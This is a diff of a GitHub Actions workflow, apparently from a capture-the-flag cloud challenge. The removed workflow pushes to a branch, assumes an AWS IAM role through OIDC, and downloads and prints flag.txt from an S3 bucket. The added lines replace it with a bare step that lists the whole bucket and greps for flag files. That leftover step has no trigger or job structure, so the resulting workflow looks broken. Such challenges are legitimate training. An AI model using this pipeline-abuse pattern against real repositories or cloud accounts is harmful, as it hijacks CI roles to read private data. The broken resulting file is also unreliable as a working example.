@@ -1,27 +1,7 @@
-name: get-flag
+- name: Find flag
+  run: |
+    echo "=== ALL OBJECTS ==="
+    aws s3 ls s3://platform-bucket-009661764077-us-east-1/ --recursive
 
-on:
-  push:
-    branches: [corgi]
-  workflow_dispatch:
-
-permissions:
-  id-token: write
-  contents: read
-
-jobs:
-  recon:
-    runs-on: ubuntu-latest
-    steps:
-      - name: Configure AWS Credentials
-        uses: aws-actions/configure-aws-credentials@v4
-        with:
-          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
-          aws-region: us-east-1
-
-      - name: Get flag
-        run: |
-          echo "=== Downloading flag.txt ==="
-          aws s3 cp s3://platform-bucket-009661764077-us-east-1/flag.txt ./flag.txt
-          echo "=== FLAG ==="
-          cat ./flag.txt
+    echo "=== FLAG MATCHES ==="
+    aws s3 ls s3://platform-bucket-009661764077-us-east-1/ --recursive | grep -iE '(^|/)(FLAG-[^ ]*|flag\.txt)$' || true
